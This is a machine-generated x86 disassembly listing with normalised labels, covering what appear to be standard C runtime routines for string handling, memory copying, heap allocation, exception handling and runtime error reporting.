mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_40e438
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e979
add esp 0x14
mov eax esi
jmp r-xdata
sub_40dd74
push 0xc
push r--data
call sub_40c6e8
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_40c72d
retn
push 0x4
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40f9aa
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ddba
sub_40ddc3
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffe0
ja r-xdata
push ebp
call sub_40ffcb
pop ecx
call sub_40e438
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
push ebx
mov ebx [ HeapAlloc@IAT ]
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_40e5eb
push 0x1e
call sub_40e44b
push 0xff
call sub_40d965
cmp eax 0x3
jne r-xdata
cmp ebp esi
je r-xdata
cmp ebp esi
jne r-xdata
push ebp
call sub_40dd74
cmp eax esi
pop ecx
jne r-xdata
xor eax eax
inc eax
mov eax ebp
jmp r-xdata
add edi 0xf
and edi 0xfffffff0
push edi
xor edi edi
inc edi
mov esi eax
test esi esi
jne r-xdata
push esi
push [ rw-data ]
call ebx
push eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] eax
push 0xc
pop edi
je r-xdata
call sub_40e438
mov [ eax ] edi
push ebp
call sub_40ffcb
test eax eax
pop ecx
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
mov edi ebp
jne r-xdata
jmp r-xdata
call sub_40e438
mov [ eax ] edi
sub_40de90
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40df1b
push 0xc
push r--data
call sub_40c6e8
push 0xe
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40df82
call sub_40c72d
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40d805
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_40d805
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_40df8c
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40e01c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40dced
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40dd0c
jmp r-xdata
sub_40e01c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40acd2
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40df8c
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40e07e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40e0ae
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40e0e0
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_40e110
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_40e152
push 0x8
push r--data
call sub_40c6e8
and [ ebp - 0x4 ] 0x0
mov edx __dos_header
push edx
call sub_40e0e0
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax edx
push eax
push edx
call sub_40e110
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_40c72d
retn
sub_40e1be
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40e245
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_40e245
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_40e1be
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_40e338
push 0x14
push r--data
call sub_40c6e8
xor edi edi
mov [ ebp - 0x1c ] edi
push [ rw-data ]
call sub_40c105
pop ecx
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x20 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_40d992
pop ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40c72d
retn
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40e87d
add esp 0x14
mov esi sub_40e328
push rw-data
call [ GetModuleHandleA@IAT ]
cmp eax edi
je r-xdata
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call sub_40c099
pop ecx
mov [ rw-data ] eax
sub_40e3fd
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
retn
inc ecx
cmp ecx 0x2d
jl r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
retn
push 0xd
pop eax
retn
sub_40e44b
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
xor edi edi
cmp edi 0x17
jae r-xdata
inc edi
cmp edi 0x17
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
push 0x3
call sub_41018b
cmp eax 0x1
pop ecx
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebp eax
cmp ebp esi
je r-xdata
push 0x3
call sub_41018b
test eax eax
pop ecx
jne r-xdata
pop ebp
cmp ebp 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_40de90
pop ecx
push eax
push [ esi ]
push ebp
call [ WriteFile@IAT ]
push rw-data
mov ebx 0x314
push ebx
mov ebp rw-data
push ebp
call sub_40dd0f
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40e87d
add esp 0x14
push esi
call sub_40de90
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
push rw-data
push 0x2fb
push esi
call sub_40dd0f
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_40de90
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push rw-data
sub ecx eax
push ecx
push eax
call sub_40ea76
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e87d
add esp 0x14
push [ edi * 8 + rw-data ]
push ebx
push ebp
call sub_40e9b8
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40e87d
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_40e87d
add esp 0x14
jmp r-xdata
push 0x12010
push rw-data
push ebp
call sub_40ffed
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40e87d
add esp 0x14
push rw-data
push ebx
push ebp
call sub_40e9b8
add esp 0xc
test eax eax
je r-xdata
sub_40e5eb
push 0x3
call sub_41018b
cmp eax 0x1
pop ecx
je r-xdata
push 0xfc
call sub_40e44b
push 0xff
call sub_40e44b
pop ecx
pop ecx
push 0x3
call sub_41018b
test eax eax
pop ecx
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40e624
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_40d805
push [ esi + 0x8 ]
call sub_40d805
push [ esi + 0xc ]
call sub_40d805
push [ esi + 0x10 ]
call sub_40d805
push [ esi + 0x14 ]
call sub_40d805
push [ esi + 0x18 ]
call sub_40d805
push [ esi ]
call sub_40d805
push [ esi + 0x20 ]
call sub_40d805
push [ esi + 0x24 ]
call sub_40d805
push [ esi + 0x28 ]
call sub_40d805
push [ esi + 0x2c ]
call sub_40d805
push [ esi + 0x30 ]
call sub_40d805
push [ esi + 0x34 ]
call sub_40d805
push [ esi + 0x1c ]
call sub_40d805
push [ esi + 0x38 ]
call sub_40d805
push [ esi + 0x3c ]
call sub_40d805
add esp 0x40
push [ esi + 0x40 ]
call sub_40d805
push [ esi + 0x44 ]
call sub_40d805
push [ esi + 0x48 ]
call sub_40d805
push [ esi + 0x4c ]
call sub_40d805
push [ esi + 0x50 ]
call sub_40d805
push [ esi + 0x54 ]
call sub_40d805
push [ esi + 0x58 ]
call sub_40d805
push [ esi + 0x5c ]
call sub_40d805
push [ esi + 0x60 ]
call sub_40d805
push [ esi + 0x64 ]
call sub_40d805
push [ esi + 0x68 ]
call sub_40d805
push [ esi + 0x6c ]
call sub_40d805
push [ esi + 0x70 ]
call sub_40d805
push [ esi + 0x74 ]
call sub_40d805
push [ esi + 0x78 ]
call sub_40d805
push [ esi + 0x7c ]
call sub_40d805
add esp 0x40
push [ esi + 0x80 ]
call sub_40d805
push [ esi + 0x84 ]
call sub_40d805
push [ esi + 0x88 ]
call sub_40d805
push [ esi + 0x8c ]
call sub_40d805
push [ esi + 0x90 ]
call sub_40d805
push [ esi + 0x94 ]
call sub_40d805
push [ esi + 0x98 ]
call sub_40d805
push [ esi + 0x9c ]
call sub_40d805
push [ esi + 0xa0 ]
call sub_40d805
push [ esi + 0xa4 ]
call sub_40d805
push [ esi + 0xa8 ]
call sub_40d805
add esp 0x2c
sub_40e7b4
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
push esi
call sub_40d805
pop ecx
sub_40e7f4
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40d805
pop ecx
push esi
call sub_40d805
pop ecx
sub_40e87d
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
push esi
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_40acf0
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
add esp 0xc
mov [ ebp - 0x80 ] 0xc000000d
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov esi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc000000d
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
xor ecx ebp
pop esi
call sub_40acd2
add ebp 0x2a8
leave
retn
test esi esi
jne r-xdata
push 0x2
call sub_40c3bc
pop ecx
sub_40e979
push ebp
mov ebp esp
push [ rw-data ]
call sub_40c105
test eax eax
pop ecx
je r-xdata
push 0x2
call sub_40c3bc
pop ecx
pop ebp
jmp sub_40e87d
pop ebp
jmp eax
sub_40e9b8
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
call sub_40e438
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_40e438
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e979
add esp 0x14
mov eax esi
jmp r-xdata
sub_40ea30
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40ea76
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push edi
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_40e438
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_40e438
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e979
add esp 0x14
mov eax esi
jmp r-xdata
sub_40eb30
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40ebb8 ]
jmp [ ecx * 4 + jump_table_40ec38 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eca4 ]
pop esi
pop edi
pop ebp
jmp sub_40e245
jmp [ ecx * 4 + jump_table_40ee40 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40ed44 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ee40 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40eca4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40ee40 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eca4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eca4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40eca4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ee40 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ee40 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ee40 ]
sub_40ee95
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push rw-data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
